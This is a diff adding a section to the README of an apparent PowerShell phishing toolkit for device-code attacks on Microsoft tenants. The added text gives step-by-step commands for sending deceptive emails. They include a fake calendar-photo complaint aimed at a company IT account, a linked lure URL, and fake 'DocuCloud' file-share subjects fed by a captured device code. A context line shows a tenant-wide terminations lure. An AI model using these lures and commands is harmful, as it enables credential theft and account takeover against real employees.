@@ -68,6 +68,36 @@ Chaos Phishing - Blast the Whole Tenant using the generated users list and a cus
 .\PhirstPhish.ps1 -messageContent "Hey, did you see who they're letting go? Check it out https://notices.azurewebsites.net/terminations.pdf" -targetUser all
 ```
 
+#### Next.ps1 / Second.ps1
+
+Can use Next.ps1 to take in the code, replace the value in a template and send the first email, using Second.ps1, ironically. You need the code from PhirstPhish, you feed it into the Next.ps1 script, which replaces the value, and uses second.ps1, a stripped down version of phirst w/ no loot functions.
+
+### Quick Steps
+
+#### Terminal One - Create insider lure device code for second step
+```powershell
+# First Step, target privileged account with payload link this will go out as an internal user
+$url = "https://invoicecity.azurewebsites.net/coolplans" 
+$messageContent = "Hey, <p></p> this company used photos of some of our projects for their yearly calendar, they said 'hope you don't mind!! We wanted to give you final say and make sure you are happy with them before we go to print.' Can you believe that? <p></p> $url <p></p> Take a look and let me know before the boss gets involved. Thank you!"
+$targetUser = "it@corpomax.com"
+$subject = "'FW: Photos of your company's work used in our upcoming 2024 Calendar'"
+
+.\PhirstPhish.ps1 -targetUser $targetUser -messageContent $messageContent -subject $subject
+```
+
+#### Terminal Two - Run Next.ps1 and enter the code from the first step, then use YOUR phishing account to authenticate and send from template
+#### Replaces code in Bluebeam template and sends the initial email
+#### If you want to use the other template, modify Next.ps1 and Replace.ps1 and open a Pull Request please :)
+
+```powershell
+.\Next.ps1 -firstUser scrub@copromax.com -subject "A DocuCloud user has shared a file with you"
+```
+OR simply to pick a random subject included. You should replace these, they are meant to serve as indicators if you're lazy.
+
+```
+Next.ps1
+```
+
 
 #### Acknowledgements 
 
